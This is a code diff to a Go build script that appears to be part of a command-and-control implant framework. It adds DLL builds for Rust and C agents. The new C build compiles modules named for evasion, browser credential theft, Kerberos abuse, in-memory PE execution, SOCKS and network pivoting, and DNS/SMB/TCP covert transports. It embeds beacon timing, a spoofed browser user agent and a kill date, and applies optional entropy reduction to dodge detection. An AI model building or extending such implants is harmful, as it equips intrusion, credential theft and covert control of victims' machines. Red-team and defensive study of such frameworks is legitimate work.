@@ -500,6 +500,12 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 		}
 	}
 
+	isDLL := cfg.Format == "dll"
+	if isDLL {
+		outName = agentName(cfg, ".dll")
+		outPath = filepath.Join(outDir, outName)
+	}
+
 	buildDir := filepath.Join(agentDir, "target", "x86_64-pc-windows-gnu", "release")
 	cmd := exec.Command(cargo, "build", "--release", "--target", "x86_64-pc-windows-gnu")
 	cmd.Dir  = agentDir
@@ -508,7 +514,13 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 		return "", fmt.Errorf("rust build failed: %v\n%s", err, out)
 	}
 
-	src := filepath.Join(buildDir, "agent-rust.exe")
+	var srcName string
+	if isDLL {
+		srcName = "agent_rust.dll"
+	} else {
+		srcName = "agent-rust.exe"
+	}
+	src := filepath.Join(buildDir, srcName)
 	if err := copyFile(src, outPath); err != nil {
 		return "", fmt.Errorf("copy rust binary: %w", err)
 	}
@@ -615,6 +627,85 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 	cmd.Dir = root
 	if out, err := cmd.CombinedOutput(); err != nil {
 		return "", fmt.Errorf("c agent build failed: %v\n%s", err, out)
+	}
+	if cfg.EntropyReduce {
+		_ = reduceEntropy(outPath)
+	}
+	return outPath, nil
+}
+
+// BuildCAgentDLL cross-compiles the C agent as a Windows DLL.
+// Uses agent_dll.c (DllMain entry) instead of agent.c (WinMain entry).
+func BuildCAgentDLL(cfg BuildConfig, outDir string) (string, error) {
+	cc := "x86_64-w64-mingw32-gcc"
+	if _, err := exec.LookPath(cc); err != nil {
+		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
+	}
+
+	root    := projectRoot()
+	outDir   = absDir(root, outDir)
+	agentDir := filepath.Join(root, "agents", "agent-c")
+	os.MkdirAll(outDir, 0755)
+
+	outPath := filepath.Join(outDir, agentName(cfg, ".dll"))
+
+	sleepSec := cfg.SleepSec
+	if sleepSec <= 0 { sleepSec = 5 }
+	jitter := cfg.JitterPct
+	if jitter < 0 { jitter = 20 }
+	ua := cfg.UserAgent
+	if ua == "" {
+		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+	}
+	dnsServer := cfg.DNSServer
+	if dnsServer == "" { dnsServer = "8.8.8.8" }
+
+	// DLL sources: replace agent.c with agent_dll.c
+	sources := []string{
+		filepath.Join(agentDir, "agent_dll.c"),
+		filepath.Join(agentDir, "evasion.c"),
+		filepath.Join(agentDir, "transport.c"),
+		filepath.Join(agentDir, "transport_dns.c"),
+		filepath.Join(agentDir, "transport_doh.c"),
+		filepath.Join(agentDir, "transport_smb.c"),
+		filepath.Join(agentDir, "transport_tcp.c"),
+		filepath.Join(agentDir, "commands.c"),
+		filepath.Join(agentDir, "crypto.c"),
+		filepath.Join(agentDir, "b64.c"),
+		filepath.Join(agentDir, "api_resolve.c"),
+		filepath.Join(agentDir, "kerberos.c"),
+		filepath.Join(agentDir, "pe_exec.c"),
+		filepath.Join(agentDir, "dotnet.c"),
+		filepath.Join(agentDir, "browsercreds.c"),
+		filepath.Join(agentDir, "rsocks.c"),
+		filepath.Join(agentDir, "http_pivot.c"),
+		filepath.Join(agentDir, "tcp_pivot.c"),
+		filepath.Join(agentDir, "sqlite3.o"),
+	}
+
+	args := []string{
+		"-O2", "-s", "-shared",
+		"-Wno-unused-parameter", "-Wno-format-truncation", "-Wno-stringop-truncation",
+		fmt.Sprintf("-DAGENT_SERVER_URL=%q", cfg.ServerURL),
+		fmt.Sprintf("-DAGENT_TRANSPORT=%q", cfg.Transport),
+		fmt.Sprintf("-DAGENT_SLEEP_SEC=%d", sleepSec),
+		fmt.Sprintf("-DAGENT_JITTER_PCT=%d", jitter),
+		fmt.Sprintf("-DAGENT_USER_AGENT=%q", ua),
+		fmt.Sprintf("-DAGENT_KILL_DATE=%q", cfg.KillDate),
+		fmt.Sprintf("-DAGENT_SMB_PIPE=%q", cfg.SMBPipe),
+		fmt.Sprintf("-DAGENT_BEACON_URIS=%q", cfg.BeaconURIs),
+		fmt.Sprintf("-DAGENT_CANARY_DOMAIN=%q", cfg.CanaryDomain),
+		fmt.Sprintf("-DAGENT_DNS_SERVER=%q", dnsServer),
+		fmt.Sprintf("-DAGENT_DNS_DOMAIN=%q", cfg.DNSDomain),
+		"-o", outPath,
+	}
+	args = append(args, sources...)
+	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32", "-lgdi32", "-lole32", "-loleaut32")
+
+	cmd := exec.Command(cc, args...)
+	cmd.Dir = root
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("c agent dll build failed: %v\n%s", err, out)
 	}
 	if cfg.EntropyReduce {
 		_ = reduceEntropy(outPath)
